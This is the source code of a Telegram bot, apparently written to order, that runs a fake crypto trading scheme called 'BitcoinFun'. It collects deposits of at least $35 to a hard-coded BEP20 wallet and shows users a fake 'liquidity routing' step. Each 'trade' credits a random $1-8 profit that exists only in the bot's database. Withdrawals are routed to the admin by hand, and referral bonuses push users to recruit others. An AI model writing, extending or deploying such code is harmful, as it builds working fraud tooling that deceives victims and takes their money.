require("dotenv").config();
const { Telegraf, Markup, session } = require("telegraf");
const express = require("express");
const admin = require("firebase-admin");

/* ================= BASIC SETUP ================= */
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const app = express();
const ADMIN_ID = String(process.env.ADMIN_ID);

// 🔒 Hard-coded BEP20 address (as requested)
const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba";

/* ================= FIREBASE ================= */
admin.initializeApp({
  credential: admin.credential.cert(
    JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT)
  ),
});
const db = admin.firestore();
const users = db.collection("users");

/* ================= MIDDLEWARE ================= */
bot.use(session());

/* ================= HELPERS ================= */
const userRef = (id) => users.doc(String(id));

async function loadUser(ctx) {
  if (ctx.session.user) return ctx.session.user;

  const uid = String(ctx.from.id);
  const ref = userRef(uid);
  const snap = await ref.get();

  if (!snap.exists) {
    const data = {
      balance: 0,
      deposited: 0,
      referrals: 0,
      lastTrade: 0,
      tradesToday: 0,
      lastTradeDay: new Date().toDateString(),
      username: ctx.from.username || "",
    };
    await ref.set(data);
    ctx.session.user = data;
    return data;
  }

  const data = snap.data();
  const today = new Date().toDateString();

  if (data.lastTradeDay !== today) {
    data.tradesToday = 0;
    data.lastTradeDay = today;
    await ref.update({
      tradesToday: 0,
      lastTradeDay: today,
    });
  }

  ctx.session.user = data;
  return data;
}

/* ================= START ================= */
bot.start(async (ctx) => {
  const uid = String(ctx.from.id);
  const refId = ctx.startPayload;
  const user = await loadUser(ctx);

  // referral
  if (refId && refId !== uid) {
    const rRef = userRef(refId);
    const rSnap = await rRef.get();
    if (rSnap.exists) {
      await rRef.update({
        balance: admin.firestore.FieldValue.increment(10),
        referrals: admin.firestore.FieldValue.increment(1),
      });
      bot.telegram.sendMessage(
        refId,
        "🎉 *Referral Bonus!* You earned *$10*",
        { parse_mode: "Markdown" }
      );
    }
  }

  return ctx.replyWithMarkdown(
    "🚀 *BitcoinFun™ Smart Liquidity Engine*\n\n" +
      "⚡ Ultra-fast execution\n" +
      "🌊 Deep liquidity simulation\n" +
      "🤖 Automated probability engine\n\n" +
      "💰 *Minimum Capital:* `$35`\n" +
      "⏱ 2 trades/day • 💸 Withdraw anytime\n\n" +
      "_Tap below to enter the system_ 👇",
    Markup.inlineKeyboard([
      [Markup.button.callback("➕ ADD CAPITAL ($35+)", "deposit")],
      [Markup.button.callback("📈 SMART TRADE (UP / DOWN)", "trade_menu")],
      [Markup.button.callback("💳 WITHDRAW PROFITS", "withdraw")],
      [Markup.button.callback("🆘 LIVE SUPPORT", "support")],
      [Markup.button.callback("🤝 REFER & EARN $10", "refer")],
    ])
  );
});

/* ================= DEPOSIT ================= */
bot.action("deposit", async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.mode = "deposit_amount";

  return ctx.replyWithMarkdown(
    "💎 *Capital Injection Panel*\n\n" +
      "Send funds to:\n\n" +
      `\`${BEP20_ADDRESS}\`\n\n` +
      "💰 Minimum: *$35*\n\n" +
      "_Enter amount to continue_"
  );
});

/* ================= TRADE MENU ================= */
bot.action("trade_menu", async (ctx) => {
  await ctx.answerCbQuery();
  return ctx.reply(
    "📊 *Choose Market Direction*",
    Markup.inlineKeyboard([
      [
        Markup.button.callback("🟢 UP (BULLISH)", "trade_up"),
        Markup.button.callback("🔴 DOWN (BEARISH)", "trade_down"),
      ],
    ])
  );
});

/* ================= TRADE EXEC ================= */
bot.action(["trade_up", "trade_down"], async (ctx) => {
  await ctx.answerCbQuery();
  const user = await loadUser(ctx);
  const uid = String(ctx.from.id);

  if (user.deposited < 35) {
    return ctx.reply("🚫 *Trading Locked*\nDeposit *$35* to unlock.", {
      parse_mode: "Markdown",
    });
  }

  const now = Date.now();
  if (user.tradesToday >= 2 && now - user.lastTrade < 12 * 60 * 60 * 1000) {
    return ctx.reply("⏳ Cooldown active. Try later.");
  }

  user.tradesToday += 1;
  user.lastTrade = now;
  await userRef(uid).update({
    tradesToday: user.tradesToday,
    lastTrade: now,
  });

  // FAST UX (no long waits)
  await ctx.reply("⚙️ Liquidity routing…");
  setTimeout(() => ctx.reply("🧠 Calculating outcome…"), 3000);

  setTimeout(async () => {
    const win = Math.floor(Math.random() * 8) + 1;
    user.balance += win;
    await userRef(uid).update({ balance: user.balance });

    ctx.replyWithMarkdown(
      `✅ *TRADE EXECUTED*\n💸 Profit: *+$${win}*\n\n⏱ Come back after cooldown`
    );
  }, 6000);
});

/* ================= WITHDRAW ================= */
bot.action("withdraw", async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.mode = "withdraw_amount";
  return ctx.reply("💳 Enter withdrawal amount:");
});

/* ================= SUPPORT ================= */
bot.action("support", async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.mode = "support";
  return ctx.reply("🆘 Type your message for Admin:");
});

/* ================= REFERRAL ================= */
bot.action("refer", async (ctx) => {
  await ctx.answerCbQuery();
  const me = await bot.telegram.getMe();
  const link = `https://t.me/${me.username}?start=${ctx.from.id}`;
  return ctx.replyWithMarkdown(
    "🤝 *Referral Program*\n\n" +
      "Earn *$10* per invite.\n\n" +
      `🔗 ${link}`
  );
});

/* ================= TEXT HANDLER ================= */
bot.on("text", async (ctx) => {
  const user = await loadUser(ctx);
  const uid = String(ctx.from.id);

  // SUPPORT
  if (ctx.session.mode === "support") {
    ctx.session.mode = null;
    await bot.telegram.sendMessage(
      ADMIN_ID,
      `🆘 SUPPORT\nUser: ${uid}\n${ctx.message.text}`
    );
    return ctx.reply("✅ Message sent to Admin.");
  }

  // DEPOSIT
  if (ctx.session.mode === "deposit_amount") {
    const amt = Number(ctx.message.text);
    if (isNaN(amt) || amt < 35) return ctx.reply("❌ Min deposit is $35.");
    ctx.session.depositAmt = amt;
    ctx.session.mode = "deposit_proof";
    return ctx.reply("📸 Upload payment screenshot.");
  }

  // WITHDRAW
  if (ctx.session.mode === "withdraw_amount") {
    const amt = Number(ctx.message.text);
    if (isNaN(amt) || amt < 30 || amt > user.deposited) {
      return ctx.reply("❌ Invalid amount.");
    }
    ctx.session.withdrawAmt = amt;
    ctx.session.mode = "withdraw_address";
    return ctx.reply("📥 Send BEP20 address:");
  }

  if (ctx.session.mode === "withdraw_address") {
    ctx.session.mode = null;
    await bot.telegram.sendMessage(
      ADMIN_ID,
      `💳 WITHDRAW REQUEST\nUser: ${uid}\nAmount: $${ctx.session.withdrawAmt}\nAddress: ${ctx.message.text}`
    );
    return ctx.reply("⏳ Withdrawal request sent.");
  }
});

/* ================= DEPOSIT PROOF ================= */
bot.on(["photo", "document"], async (ctx) => {
  if (ctx.session.mode !== "deposit_proof") return;
  ctx.session.mode = null;

  const fileId = ctx.message.photo
    ? ctx.message.photo.at(-1).file_id
    : ctx.message.document.file_id;

  await bot.telegram.sendPhoto(ADMIN_ID, fileId, {
    caption: `💰 DEPOSIT PROOF\nUser: ${ctx.from.id}\nAmount: $${ctx.session.depositAmt}`,
  });

  ctx.reply("⏳ Proof sent to Admin.");
});

/* ================= SERVER ================= */
app.get("/", (_, res) => res.send("BitcoinFun LIVE"));
app.listen(process.env.PORT || 3000, "0.0.0.0");

/* ================= LAUNCH ================= */
bot.launch().then(() => console.log("🚀 BitcoinFun Bot LIVE"));